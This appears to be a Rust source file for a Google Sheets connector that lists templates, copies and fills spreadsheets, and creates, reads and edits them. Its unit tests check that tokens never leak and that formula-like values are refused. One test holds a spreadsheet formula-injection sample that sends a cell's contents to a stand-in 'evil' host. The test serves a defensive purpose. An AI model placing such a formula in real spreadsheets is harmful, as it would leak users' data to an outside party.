//! Google Sheets connector: lists spreadsheet templates (Drive), copies one,
//! fills its `{{placeholders}}`, creates, reads and edits spreadsheets. The stored secret is a Google refresh token from the
//! dashboard's Connect with Google flow (`auth = OauthGoogle`); the OAuth client
//! is the one saved on the Inbox Triage setup page. No message built here ever
//! contains a token.

use super::drive::{self, placeholders_in, text_of};
use super::google_auth::GoogleAuth;
pub use super::google_auth::{ClientFn, RefreshError, RefreshFn};
use super::http::{quote, urlencode, TEST_TIMEOUT_SECONDS};
use super::*;
use serde_json::json;

pub const SHEETS_URL: &str = "https://sheets.googleapis.com/v4/spreadsheets";
/// `describe_sheet` returns at most this many tabs, rows per tab and columns per row.
const MAX_TABS: usize = 10;
const MAX_ROWS: usize = 200;
const MAX_COLS: usize = 30;
/// A1 form of the window read per tab: one row and one column past the caps, so
/// an overflow is detected exactly. Column 31 is `AE`.
const READ_RANGE: &str = "A1:AE201";

pub const INFO: TypeInfo = TypeInfo {
    name: "google_sheets",
    label: "Google Sheets",
    icon: "fact_check",
    capabilities: &[SHEETS],
    fields: &[],
    secret_label: None,
    external: false,
    brand: "googlesheets",
    description: "Pick shared spreadsheet templates, create a new sheet from one with your approval in chat, and review it here.",
    docs_url: "https://support.google.com/docs/answer/6000292",
    category: "google",
    presets: &[],
    auth: Auth::OauthGoogle,
};

pub struct GoogleSheetsConnector {
    account: Account,
    http: Arc<dyn HttpClient>,
    auth: GoogleAuth,
}

pub fn web_link(id: &str) -> String {
    format!("https://docs.google.com/spreadsheets/d/{id}/edit")
}

/// A tab name quoted for use in an A1 range.
fn quote_tab(name: &str) -> String {
    format!("'{}'", name.replace('\'', "''"))
}

/// The cell text of a values entry; the API sends strings, but be lenient.
fn cell_text(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

/// Shape one tab's `values` into at most `MAX_ROWS` x `MAX_COLS` string cells,
/// padded to a rectangle. Returns the rows and whether anything was cut.
fn shape_rows(values: Option<&Value>) -> (Vec<Vec<String>>, bool) {
    let all: Vec<&Vec<Value>> = values
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_array)
        .collect();
    let mut truncated = all.len() > MAX_ROWS;
    let mut rows: Vec<Vec<String>> = all
        .into_iter()
        .take(MAX_ROWS)
        .map(|r| {
            truncated |= r.len() > MAX_COLS;
            r.iter().take(MAX_COLS).map(cell_text).collect()
        })
        .collect();
    let width = rows.iter().map(Vec::len).max().unwrap_or(0);
    for r in &mut rows {
        r.resize(width, String::new());
    }
    (rows, truncated)
}

fn str_field<'a>(op: &'a Value, key: &str) -> &'a str {
    op.get(key).and_then(Value::as_str).unwrap_or("")
}

/// `values` must be a non-empty array of arrays of strings.
fn grid(v: Option<&Value>, what: &str) -> ConnResult<Vec<Vec<String>>> {
    let bad = || ConnectorError::msg(format!("{what}: values must be rows of text"));
    let rows = v.and_then(Value::as_array).ok_or_else(bad)?;
    rows.iter()
        .map(|r| {
            r.as_array()
                .ok_or_else(bad)?
                .iter()
                .map(|c| c.as_str().map(str::to_string).ok_or_else(bad))
                .collect()
        })
        .collect()
}

/// Check an A1 range as the caller gave it: `Tab!A1:C3` or `'My Tab'!A1`, with a
/// non-empty tab and a plain cell reference. Nothing is computed from it.
fn validate_range(range: &str) -> ConnResult<()> {
    let bad = |why: &str| ConnectorError::msg(format!("Invalid range \"{range}\": {why}"));
    let Some((tab, cells)) = range.rsplit_once('!') else {
        return Err(bad("write it as Tab!A1 or Tab!A1:C3"));
    };
    let tab = tab.trim();
    let quoted = tab.len() >= 2 && tab.starts_with('\'') && tab.ends_with('\'');
    let tab_name = if quoted { &tab[1..tab.len() - 1] } else { tab };
    if tab_name.trim().is_empty() {
        return Err(bad("the tab name is empty"));
    }
    if !quoted && tab_name.contains('\'') {
        return Err(bad("unbalanced quote in the tab name"));
    }
    if !quoted && tab_name.contains(char::is_whitespace) {
        return Err(bad("quote a tab name containing spaces, like 'My Tab'!A1"));
    }
    if cells.is_empty()
        || !cells
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '$' || c == ':')
        || cells.matches(':').count() > 1
        || cells.starts_with(':')
        || cells.ends_with(':')
        || !cells.chars().any(|c| c.is_ascii_alphanumeric())
    {
        return Err(bad("the cell part must look like A1 or A1:C3"));
    }
    Ok(())
}

/// Whether `value` would be read as a formula if a cell were set to it: it starts
/// with `=`, or with `+`, `-` or `@` followed by a letter or `(`. Plain numbers
/// and text such as `-5` or `+1 555 0100` are not formulas.
pub(crate) fn looks_like_formula(value: &str) -> bool {
    let mut chars = value.chars();
    match chars.next() {
        Some('=') => true,
        Some('+' | '-' | '@') => chars
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '('),
        _ => false,
    }
}

/// Check one edit op's shape; the error names the op.
pub(crate) fn validate_op(op: &Value) -> ConnResult<()> {
    let kind = str_field(op, "op");
    if kind != "set" && kind != "append" {
        return Err(ConnectorError::msg(format!(
            "Unknown edit op \"{kind}\"; use set or append"
        )));
    }
    validate_range(str_field(op, "range"))?;
    if grid(op.get("values"), kind)?.is_empty() {
        return Err(ConnectorError::msg(format!("{kind}: values has no rows")));
    }
    Ok(())
}

/// Check one new tab's shape and return its name and rows.
pub(crate) fn validate_tab(tab: &Value) -> ConnResult<(String, Vec<Vec<String>>)> {
    let name = str_field(tab, "name").trim().to_string();
    if name.is_empty()
        || name.chars().count() > 100
        || name.contains(['[', ']', '*', '?', ':', '/', '\\'])
    {
        return Err(ConnectorError::msg(format!(
            "Invalid tab name \"{name}\": use 1-100 characters without [ ] * ? : / \\"
        )));
    }
    let rows = match tab.get("rows") {
        None => Vec::new(),
        some => grid(some, &format!("tab \"{name}\""))?,
    };
    Ok((name, rows))
}

impl GoogleSheetsConnector {
    pub fn new(account: Account, secret: Option<String>, http: Arc<dyn HttpClient>) -> Self {
        Self {
            account,
            auth: GoogleAuth::new(secret, http.clone()),
            http,
        }
    }

    pub fn with_client_fn(mut self, f: ClientFn) -> Self {
        self.auth.client_fn = f;
        self
    }

    pub fn with_refresh_fn(mut self, f: RefreshFn) -> Self {
        self.auth.refresh_fn = f;
        self
    }

    fn fail(&self, e: HttpError, token: &str) -> ConnectorError {
        match e.status {
            Some(401) | Some(403) => {
                ConnectorError::msg("Reconnect Google Sheets to grant Sheets and Drive access")
            }
            _ => ConnectorError::msg(self.auth.describe(&ConnectorError::Http(e), Some(token))),
        }
    }

    fn call(
        &self,
        method: &str,
        url: &str,
        token: &str,
        body: Option<Value>,
        attempts: u32,
    ) -> ConnResult<Value> {
        let req = HttpRequest::new(method, url)
            .token(Some(token))
            .json(body)
            .timeout_secs(30)
            .attempts(attempts);
        self.http
            .request_json(&req)
            .map_err(|e| self.fail(e, token))
    }

    fn write_values(&self, id: &str, token: &str, op: &Value) -> ConnResult<()> {
        let kind = str_field(op, "op");
        let range = str_field(op, "range");
        let body = json!({"range": range, "majorDimension": "ROWS", "values": op["values"]});
        if kind == "set" {
            let url = format!(
                "{SHEETS_URL}/{}/values/{}?valueInputOption=RAW",
                quote(id),
                quote(range)
            );
            // Setting the same range twice is harmless, so it may be retried.
            self.call("PUT", &url, token, Some(body), 3)?;
        } else {
            let url = format!(
                "{SHEETS_URL}/{}/values/{}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS",
                quote(id),
                quote(range)
            );
            self.call("POST", &url, token, Some(body), 1)?;
        }
        Ok(())
    }
}

impl Connector for GoogleSheetsConnector {
    fn info(&self) -> &'static TypeInfo {
        &INFO
    }

    fn account(&self) -> &Account {
        &self.account
    }

    fn test(&self) -> (bool, String) {
        let token = match self.auth.access_token() {
            Ok(t) => t,
            Err(m) => return (false, m),
        };
        let req = HttpRequest::new("GET", &drive::probe_url(drive::SPREADSHEET_MIME))
            .token(Some(&token))
            .timeout_secs(TEST_TIMEOUT_SECONDS)
            .attempts(1);
        match self.http.request_json(&req) {
            Ok(_) => (
                true,
                "Connected: Google Sheets and Drive are reachable".into(),
            ),
            Err(e) => match e.status {
                Some(401) | Some(403) => (
                    false,
                    "Reconnect Google Sheets to grant Sheets and Drive access".into(),
                ),
                _ => (
                    false,
                    self.auth.describe(&ConnectorError::Http(e), Some(&token)),
                ),
            },
        }
    }

    fn list_templates(&self, query: &str, limit: u32) -> ConnResult<Vec<Value>> {
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let url = drive::list_url(drive::SPREADSHEET_MIME, query, limit);
        let data = self.call("GET", &url, &token, None, 3)?;
        Ok(drive::rows(&data, web_link))
    }

    fn copy_sheet(&self, template_id: &str, title: &str) -> ConnResult<Value> {
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let url = drive::copy_url(template_id);
        let made = self.call("POST", &url, &token, Some(json!({"name": title})), 1)?;
        let id = text_of(made.get("id"));
        if id.is_empty() {
            return Err(ConnectorError::msg(
                "Google returned no id for the new spreadsheet",
            ));
        }
        Ok(json!({"id": id, "web_link": web_link(&id)}))
    }

    fn fill_sheet(&self, sheet_id: &str, replacements: &[(String, String)]) -> ConnResult<Value> {
        if replacements.is_empty() {
            return Ok(json!({"replaced": 0}));
        }
        // findReplace cannot write raw text, so a value that would become a
        // formula is refused (all of them, before the first request).
        if let Some((k, _)) = replacements.iter().find(|(_, v)| looks_like_formula(v)) {
            return Err(ConnectorError::msg(format!(
                "The value for \"{k}\" looks like a formula; formulas are not allowed in replacements"
            )));
        }
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let requests: Vec<Value> = replacements
            .iter()
            .map(|(k, v)| {
                json!({"findReplace": {
                    "find": format!("{{{{{k}}}}}"),
                    "replacement": v,
                    "matchCase": true,
                    "allSheets": true}})
            })
            .collect();
        let url = format!("{SHEETS_URL}/{}:batchUpdate", quote(sheet_id));
        let done = self.call("POST", &url, &token, Some(json!({"requests": requests})), 1)?;
        let replaced: u64 = done
            .get("replies")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(|r| r.pointer("/findReplace/occurrencesChanged")?.as_u64())
            .sum();
        Ok(json!({"replaced": replaced}))
    }

    fn create_sheet(&self, title: &str, tabs: &[Value]) -> ConnResult<Value> {
        if title.trim().is_empty() {
            return Err(ConnectorError::msg("The spreadsheet title is empty"));
        }
        let mut parsed = Vec::new();
        for tab in tabs {
            parsed.push(validate_tab(tab)?);
        }
        let mut seen: Vec<String> = Vec::new();
        for (name, _) in &parsed {
            let key = name.to_lowercase();
            if seen.contains(&key) {
                return Err(ConnectorError::msg(format!(
                    "Duplicate tab name \"{name}\""
                )));
            }
            seen.push(key);
        }
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let mut body = json!({"properties": {"title": title}});
        if !parsed.is_empty() {
            body["sheets"] = parsed
                .iter()
                .map(|(n, _)| json!({"properties": {"title": n}}))
                .collect();
        }
        let made = self.call("POST", SHEETS_URL, &token, Some(body), 1)?;
        let id = text_of(made.get("spreadsheetId"));
        if id.is_empty() {
            return Err(ConnectorError::msg(
                "Google returned no id for the new spreadsheet",
            ));
        }
        let data: Vec<Value> = parsed
            .iter()
            .filter(|(_, rows)| !rows.is_empty())
            .map(|(n, rows)| json!({"range": format!("{}!A1", quote_tab(n)), "values": rows}))
            .collect();
        if !data.is_empty() {
            let url = format!("{SHEETS_URL}/{}/values:batchUpdate", quote(&id));
            let write = json!({"valueInputOption": "RAW", "data": data});
            self.call("POST", &url, &token, Some(write), 1)
                .map_err(|e| {
                    ConnectorError::msg(format!(
                        "{e} (the spreadsheet was created without its cell values: {})",
                        web_link(&id)
                    ))
                })?;
        }
        Ok(json!({"id": id, "web_link": web_link(&id)}))
    }

    fn describe_sheet(&self, sheet_id: &str) -> ConnResult<Value> {
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let meta_url = format!(
            "{SHEETS_URL}/{}?{}",
            quote(sheet_id),
            urlencode(&[("fields", "properties.title,sheets.properties.title".into())])
        );
        let meta = self.call("GET", &meta_url, &token, None, 3)?;
        let all_names: Vec<String> = meta
            .get("sheets")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .map(|s| text_of(s.pointer("/properties/title")))
            .collect();
        let mut truncated = all_names.len() > MAX_TABS;
        let names: Vec<String> = all_names.into_iter().take(MAX_TABS).collect();
        let mut tabs = Vec::new();
        let mut placeholders: Vec<String> = Vec::new();
        if !names.is_empty() {
            let mut pairs: Vec<(&str, String)> = names
                .iter()
                .map(|n| ("ranges", format!("{}!{READ_RANGE}", quote_tab(n))))
                .collect();
            pairs.push(("valueRenderOption", "FORMATTED_VALUE".into()));
            let url = format!(
                "{SHEETS_URL}/{}/values:batchGet?{}",
                quote(sheet_id),
                urlencode(&pairs)
            );
            let got = self.call("GET", &url, &token, None, 3)?;
            let ranges = got.get("valueRanges").and_then(Value::as_array);
            // Merged cells other than the top-left one come back as "".
            for (i, name) in names.iter().enumerate() {
                let values = ranges.and_then(|r| r.get(i)).and_then(|r| r.get("values"));
                let (rows, tab_truncated) = shape_rows(values);
                truncated |= tab_truncated;
                for row in &rows {
                    for cell in row {
                        for p in placeholders_in(cell) {
                            if !placeholders.contains(&p) {
                                placeholders.push(p);
                            }
                        }
                    }
                }
                tabs.push(json!({"name": name, "rows": rows, "truncated": tab_truncated}));
            }
        }
        Ok(json!({
            "id": sheet_id,
            "title": text_of(meta.pointer("/properties/title")),
            "web_link": web_link(sheet_id),
            "placeholders": placeholders,
            "tabs": tabs,
            "truncated": truncated,
        }))
    }

    /// Ops run in order, one request each, on the A1 ranges as given. Values are
    /// written raw, so text is never evaluated as a formula. Every op is checked
    /// before the first request; a later failure says how many ops were applied.
    fn edit_sheet(&self, sheet_id: &str, ops: &[Value]) -> ConnResult<Value> {
        for op in ops {
            validate_op(op)?;
        }
        let token = self.auth.access_token().map_err(ConnectorError::msg)?;
        let mut applied = 0u64;
        for op in ops {
            self.write_values(sheet_id, &token, op).map_err(|e| {
                ConnectorError::msg(format!(
                    "{e} ({applied} earlier edit{} applied)",
                    if applied == 1 { "" } else { "s" }
                ))
            })?;
            applied += 1;
        }
        Ok(json!({"applied": applied}))
    }
}

#[cfg(test)]
mod tests {
    use super::super::testutil::FakeHttp;
    use super::*;

    fn conn(http: Arc<dyn HttpClient>, secret: Option<&str>) -> GoogleSheetsConnector {
        GoogleSheetsConnector::new(
            Account::new("a", "google_sheets"),
            secret.map(str::to_string),
            http,
        )
        .with_client_fn(Arc::new(|| json!({"client_id": "c", "client_secret": "s"})))
        .with_refresh_fn(Arc::new(|_, _| Ok("AT-SECRET".to_string())))
    }

    #[test]
    fn type_metadata() {
        assert_eq!(
            (
                INFO.label,
                INFO.category,
                INFO.auth,
                INFO.secret_label,
                INFO.brand
            ),
            (
                "Google Sheets",
                "google",
                Auth::OauthGoogle,
                None,
                "googlesheets"
            )
        );
        assert_eq!(INFO.capabilities, &[SHEETS]);
        assert!(INFO.fields.is_empty());
        assert!(get_type("google_sheets").is_some());
        assert!(web_link("x1").contains("/x1/"));
    }

    #[test]
    fn test_lists_one_drive_file_of_the_type() {
        let http = FakeHttp::ok(json!({"files": []}));
        let (ok, msg) = conn(http.clone(), Some("RT")).test();
        assert!(ok, "{msg}");
        let calls = http.calls.lock().unwrap();
        assert!(
            calls.iter().any(|c| c.url.starts_with(drive::DRIVE_URL)
                && c.url.contains("google-apps.spreadsheet")
                && c.url.contains("pageSize=1")),
            "{:?}",
            calls.iter().map(|c| &c.url).collect::<Vec<_>>()
        );
    }

    #[test]
    fn permission_errors_ask_to_reconnect_and_never_leak_tokens() {
        let http =
            FakeHttp::new(|req| Err(HttpError::new(Some(403), "denied AT-SECRET", &req.url)));
        let (ok, msg) = conn(http, Some("RT")).test();
        assert!(
            !ok && msg.contains("Reconnect") && !msg.contains("AT-SECRET"),
            "{msg}"
        );
    }

    #[test]
    fn unconnected_account_says_to_connect() {
        let (ok, msg) = conn(FakeHttp::ok(json!({})), None).test();
        assert!(!ok && msg.contains("Connect with Google"), "{msg}");
    }

    fn meta(tabs: &[&str]) -> Value {
        json!({"properties": {"title": "Budget"},
            "sheets": tabs.iter().map(|t| json!({"properties": {"title": t}})).collect::<Vec<_>>()})
    }

    fn describe_http(tabs: &[&str], ranges: Value) -> Arc<FakeHttp> {
        let m = meta(tabs);
        FakeHttp::new(move |req| {
            if req.url.contains("values:batchGet") {
                Ok(json!({"valueRanges": ranges.clone()}))
            } else {
                Ok(m.clone())
            }
        })
    }

    #[test]
    fn list_templates_shapes_spreadsheet_rows() {
        let http = FakeHttp::ok(json!({"files": [{"id": "s1", "name": "Plan"}]}));
        let rows = conn(http.clone(), Some("RT"))
            .list_templates("plan", 5)
            .unwrap();
        assert_eq!(
            rows[0]["web_link"],
            "https://docs.google.com/spreadsheets/d/s1/edit"
        );
        assert!(http.calls.lock().unwrap()[0]
            .url
            .contains("google-apps.spreadsheet"));
    }

    #[test]
    fn describe_sheet_returns_string_rows_padded_and_placeholders() {
        let http = describe_http(
            &["Data", "Empty"],
            json!([{"values": [["Hi {{name}}", 2], ["x"], []]}, {}]),
        );
        let d = conn(http.clone(), Some("RT"))
            .describe_sheet("s 1")
            .unwrap();
        assert_eq!(d["title"], "Budget");
        assert_eq!(
            d["web_link"],
            "https://docs.google.com/spreadsheets/d/s 1/edit"
        );
        assert_eq!(d["placeholders"], json!(["name"]));
        assert_eq!(d["truncated"], false);
        assert_eq!(
            d["tabs"][0],
            json!({"name": "Data", "truncated": false,
                "rows": [["Hi {{name}}", "2"], ["x", ""], ["", ""]]})
        );
        assert_eq!(
            d["tabs"][1],
            json!({"name": "Empty", "rows": [], "truncated": false})
        );
        let calls = http.calls.lock().unwrap();
        assert!(
            calls[0].url.contains("/spreadsheets/s%201"),
            "{}",
            calls[0].url
        );
        assert!(calls[1].url.contains("valueRenderOption=FORMATTED_VALUE"));
        assert!(
            calls[1].url.contains("ranges=%27Data%27%21A1%3AAE201"),
            "{}",
            calls[1].url
        );
    }

    #[test]
    fn describe_sheet_caps_rows_columns_and_tabs() {
        let wide: Vec<String> = (0..40).map(|i| format!("c{i}")).collect();
        let rows: Vec<Vec<String>> = (0..250).map(|_| wide.clone()).collect();
        let names: Vec<String> = (0..12).map(|i| format!("T{i}")).collect();
        let name_refs: Vec<&str> = names.iter().map(String::as_str).collect();
        let ranges: Vec<Value> = (0..10).map(|_| json!({"values": rows})).collect();
        let d = conn(describe_http(&name_refs, json!(ranges)), Some("RT"))
            .describe_sheet("s")
            .unwrap();
        assert_eq!(d["truncated"], true);
        let tabs = d["tabs"].as_array().unwrap();
        assert_eq!(tabs.len(), 10);
        assert_eq!(tabs[0]["truncated"], true);
        assert_eq!(tabs[0]["rows"].as_array().unwrap().len(), 200);
        assert_eq!(tabs[0]["rows"][0].as_array().unwrap().len(), 30);
        assert_eq!(tabs[0]["rows"][0][29], "c29");
    }

    #[test]
    fn describe_sheet_within_limits_is_not_truncated_and_is_char_safe() {
        let http = describe_http(&["A"], json!([{"values": [["\u{e9}\u{1F600}"]]}]));
        let d = conn(http, Some("RT")).describe_sheet("s").unwrap();
        assert_eq!(d["truncated"], false);
        assert_eq!(d["tabs"][0]["rows"][0][0], "\u{e9}\u{1F600}");
    }

    #[test]
    fn copy_sheet_posts_title_once_and_returns_link() {
        let http = FakeHttp::ok(json!({"id": "n1"}));
        let made = conn(http.clone(), Some("RT"))
            .copy_sheet("t 1", "Q4")
            .unwrap();
        assert_eq!(
            made["web_link"],
            "https://docs.google.com/spreadsheets/d/n1/edit"
        );
        let c = http.calls.lock().unwrap()[0].clone();
        assert!(c.url.contains("/files/t%201/copy"), "{}", c.url);
        assert_eq!(c.json_body.unwrap(), json!({"name": "Q4"}));
        assert_eq!(c.max_attempts, 1);
    }

    #[test]
    fn fill_sheet_replaces_across_all_tabs() {
        let http = FakeHttp::ok(json!({"replies": [
            {"findReplace": {"occurrencesChanged": 2}},
            {"findReplace": {"occurrencesChanged": 1}}]}));
        let out = conn(http.clone(), Some("RT"))
            .fill_sheet(
                "s1",
                &[("a".into(), "1".into()), ("b".into(), "two".into())],
            )
            .unwrap();
        assert_eq!(out["replaced"], 3);
        let c = http.calls.lock().unwrap()[0].clone();
        assert!(c.url.ends_with("/spreadsheets/s1:batchUpdate"), "{}", c.url);
        let r = &c.json_body.unwrap()["requests"];
        assert_eq!(r.as_array().unwrap().len(), 2);
        assert_eq!(r[0]["findReplace"]["find"], "{{a}}");
        assert_eq!(r[0]["findReplace"]["allSheets"], true);
        assert_eq!(r[0]["findReplace"]["matchCase"], true);
        assert_eq!(r[1]["findReplace"]["replacement"], "two");
        assert_eq!(
            conn(FakeHttp::ok(json!({})), Some("RT"))
                .fill_sheet("s", &[])
                .unwrap()["replaced"],
            0
        );
    }

    #[test]
    fn fill_sheet_rejects_formula_like_values_before_any_call() {
        for bad in [
            "=2",
            "=IMPORTDATA(\"https://evil/?d=\"&A1)",
            "+SUM(A1)",
            "-A1",
            "@SUM(1)",
            "+(1)",
        ] {
            let http = FakeHttp::ok(json!({}));
            let e = conn(http.clone(), Some("RT"))
                .fill_sheet(
                    "s",
                    &[("ok".into(), "fine".into()), ("k".into(), bad.into())],
                )
                .unwrap_err()
                .to_string();
            assert!(e.contains("\"k\"") && e.contains("formula"), "{e}");
            assert!(!e.contains(bad) && !e.contains("fine"), "{e}");
            assert!(http.calls.lock().unwrap().is_empty(), "{bad}");
        }
    }

    #[test]
    fn fill_sheet_accepts_plain_numbers_and_text() {
        for good in ["-5", "+1 555", "@ 3pm", "a=b", "", "- note"] {
            let http = FakeHttp::ok(json!({"replies": []}));
            conn(http.clone(), Some("RT"))
                .fill_sheet("s", &[("k".into(), good.into())])
                .unwrap();
            assert_eq!(http.calls.lock().unwrap().len(), 1, "{good}");
        }
    }

    #[test]
    fn range_validation_handles_quoted_tabs_and_rejects_loose_shapes() {
        for ok in [
            "'It''s'!A1",
            "'a!b'!A1:B2",
            "Tab!A1:C",
            "Tab!$A$1:$B$2",
            "'My Tab'!A:A",
        ] {
            assert!(validate_range(ok).is_ok(), "{ok}");
        }
        for bad in [
            "Tab!A1:",
            "Tab!:A1",
            "My Tab!A1",
            "'x!A1",
            "''!A1",
            "Tab!A1:B2:C3",
        ] {
            assert!(validate_range(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn create_sheet_rejects_an_empty_title_before_any_call() {
        let http = FakeHttp::ok(json!({"spreadsheetId": "n1"}));
        assert!(conn(http.clone(), Some("RT"))
            .create_sheet("  ", &[])
            .is_err());
        assert!(http.calls.lock().unwrap().is_empty());
    }

    #[test]
    fn create_sheet_makes_tabs_then_writes_raw_values() {
        let http = FakeHttp::ok(json!({"spreadsheetId": "n1"}));
        let made = conn(http.clone(), Some("RT"))
            .create_sheet(
                "Budget",
                &[
                    json!({"name": "Q1", "rows": [["a", "=SUM(B1)"], ["b"]]}),
                    json!({"name": "It's", "rows": []}),
                ],
            )
            .unwrap();
        assert_eq!(made["id"], "n1");
        assert_eq!(
            made["web_link"],
            "https://docs.google.com/spreadsheets/d/n1/edit"
        );
        let calls = http.calls.lock().unwrap();
        assert_eq!(calls.len(), 2, "empty tab needs no write");
        assert_eq!(calls[0].max_attempts, 1);
        let b = calls[0].json_body.clone().unwrap();
        assert_eq!(b["properties"]["title"], "Budget");
        assert_eq!(b["sheets"][1]["properties"]["title"], "It's");
        assert!(
            calls[1]
                .url
                .ends_with("/spreadsheets/n1/values:batchUpdate"),
            "{}",
            calls[1].url
        );
        let w = calls[1].json_body.clone().unwrap();
        assert_eq!(w["valueInputOption"], "RAW");
        assert_eq!(w["data"].as_array().unwrap().len(), 1);
        assert_eq!(w["data"][0]["range"], "'Q1'!A1");
        assert_eq!(w["data"][0]["values"][0][1], "=SUM(B1)");
    }

    #[test]
    fn create_sheet_rejects_bad_tabs_before_any_call() {
        let http = FakeHttp::ok(json!({"spreadsheetId": "n1"}));
        let c = conn(http.clone(), Some("RT"));
        for tabs in [
            vec![json!({"name": " ", "rows": []})],
            vec![json!({"name": "A:B", "rows": []})],
            vec![
                json!({"name": "A", "rows": []}),
                json!({"name": "a", "rows": []}),
            ],
            vec![json!({"name": "A", "rows": [["x"], "y"]})],
            vec![json!({"name": "A", "rows": [[1]]})],
        ] {
            assert!(c.create_sheet("T", &tabs).is_err(), "{tabs:?}");
        }
        assert!(http.calls.lock().unwrap().is_empty());
    }

    #[test]
    fn create_sheet_write_failure_names_the_new_sheet() {
        let http = FakeHttp::new(|req| {
            if req.url.ends_with(":batchUpdate") {
                Err(HttpError::new(Some(500), "boom AT-SECRET", &req.url))
            } else {
                Ok(json!({"spreadsheetId": "n9"}))
            }
        });
        let e = conn(http, Some("RT"))
            .create_sheet("T", &[json!({"name": "A", "rows": [["x"]]})])
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("/spreadsheets/d/n9/") && !e.contains("AT-SECRET"),
            "{e}"
        );
    }

    #[test]
    fn edit_sheet_set_uses_values_update_with_raw_input() {
        let http = FakeHttp::ok(json!({}));
        let out = conn(http.clone(), Some("RT"))
            .edit_sheet(
                "s1",
                &[json!({"op": "set", "range": "Q1!A1:B2", "values": [["=1+1", "x"]]})],
            )
            .unwrap();
        assert_eq!(out["applied"], 1);
        let c = http.calls.lock().unwrap()[0].clone();
        assert_eq!(c.method, "PUT");
        assert!(
            c.url.contains("/spreadsheets/s1/values/Q1%21A1%3AB2?"),
            "{}",
            c.url
        );
        assert!(c.url.contains("valueInputOption=RAW"), "{}", c.url);
        let b = c.json_body.unwrap();
        assert_eq!(b["values"], json!([["=1+1", "x"]]));
        assert_eq!(b["range"], "Q1!A1:B2");
    }

    #[test]
    fn edit_sheet_append_uses_values_append_with_raw_input() {
        let http = FakeHttp::ok(json!({}));
        conn(http.clone(), Some("RT"))
            .edit_sheet(
                "s1",
                &[json!({"op": "append", "range": "'My Tab'!A1", "values": [["a"], ["b"]]})],
            )
            .unwrap();
        let c = http.calls.lock().unwrap()[0].clone();
        assert_eq!(c.method, "POST");
        assert!(c.url.contains(":append?"), "{}", c.url);
        assert!(c.url.contains("valueInputOption=RAW"), "{}", c.url);
        assert!(c.url.contains("insertDataOption=INSERT_ROWS"), "{}", c.url);
        assert_eq!(c.json_body.unwrap()["values"], json!([["a"], ["b"]]));
        assert_eq!(c.max_attempts, 1);
    }

    #[test]
    fn edit_sheet_validates_every_op_before_sending_anything() {
        let http = FakeHttp::ok(json!({}));
        let c = conn(http.clone(), Some("RT"));
        let good = json!({"op": "set", "range": "A!A1", "values": [["x"]]});
        for bad in [
            json!({"op": "wipe"}),
            json!({"op": "set", "range": "A1", "values": [["x"]]}),
            json!({"op": "set", "range": "!A1", "values": [["x"]]}),
            json!({"op": "set", "range": "''!A1", "values": [["x"]]}),
            json!({"op": "set", "range": "A!", "values": [["x"]]}),
            json!({"op": "set", "range": "A!A 1", "values": [["x"]]}),
            json!({"op": "set", "range": "A!A1", "values": []}),
            json!({"op": "set", "range": "A!A1", "values": ["x"]}),
            json!({"op": "append", "range": "A!A1", "values": [[1]]}),
        ] {
            let e = c.edit_sheet("s", &[good.clone(), bad.clone()]);
            assert!(e.is_err(), "{bad}");
        }
        assert!(http.calls.lock().unwrap().is_empty());
    }

    #[test]
    fn edit_sheet_failure_reports_how_many_ops_were_applied() {
        let n = std::sync::atomic::AtomicUsize::new(0);
        let http = FakeHttp::new(move |req| {
            if n.fetch_add(1, std::sync::atomic::Ordering::SeqCst) == 1 {
                return Err(HttpError::new(Some(500), "boom AT-SECRET", &req.url));
            }
            Ok(json!({}))
        });
        let op = json!({"op": "set", "range": "A!A1", "values": [["x"]]});
        let e = conn(http.clone(), Some("RT"))
            .edit_sheet("s", &[op.clone(), op.clone(), op.clone()])
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("1 earlier edit applied") && !e.contains("AT-SECRET"),
            "{e}"
        );
        assert_eq!(http.calls.lock().unwrap().len(), 2);
    }

    #[test]
    fn server_errors_never_leak_the_access_token() {
        let http = FakeHttp::new(|req| {
            Err(HttpError::new(
                Some(500),
                "boom Bearer AT-SECRET AT-SECRET",
                &req.url,
            ))
        });
        let c = conn(http.clone(), Some("RT"));
        let set = json!({"op": "set", "range": "A!A1", "values": [["x"]]});
        let errs = [
            c.list_templates("", 5).unwrap_err().to_string(),
            c.describe_sheet("s").unwrap_err().to_string(),
            c.copy_sheet("t", "n").unwrap_err().to_string(),
            c.fill_sheet("s", &[("a".into(), "b".into())])
                .unwrap_err()
                .to_string(),
            c.create_sheet("t", &[]).unwrap_err().to_string(),
            c.edit_sheet("s", &[set]).unwrap_err().to_string(),
        ];
        for e in &errs {
            assert!(!e.contains("AT-SECRET") && !e.is_empty(), "{e}");
        }
        assert!(http.calls.lock().unwrap().iter().all(|c| !c
            .json_body
            .clone()
            .unwrap_or_default()
            .to_string()
            .contains("AT-SECRET")));
    }

    #[test]
    fn permission_errors_on_operations_ask_to_reconnect() {
        let http =
            FakeHttp::new(|req| Err(HttpError::new(Some(403), "denied AT-SECRET", &req.url)));
        let e = conn(http, Some("RT"))
            .describe_sheet("s")
            .unwrap_err()
            .to_string();
        assert!(
            e.contains("Reconnect Google Sheets to grant Sheets and Drive access")
                && !e.contains("AT-SECRET"),
            "{e}"
        );
    }
}
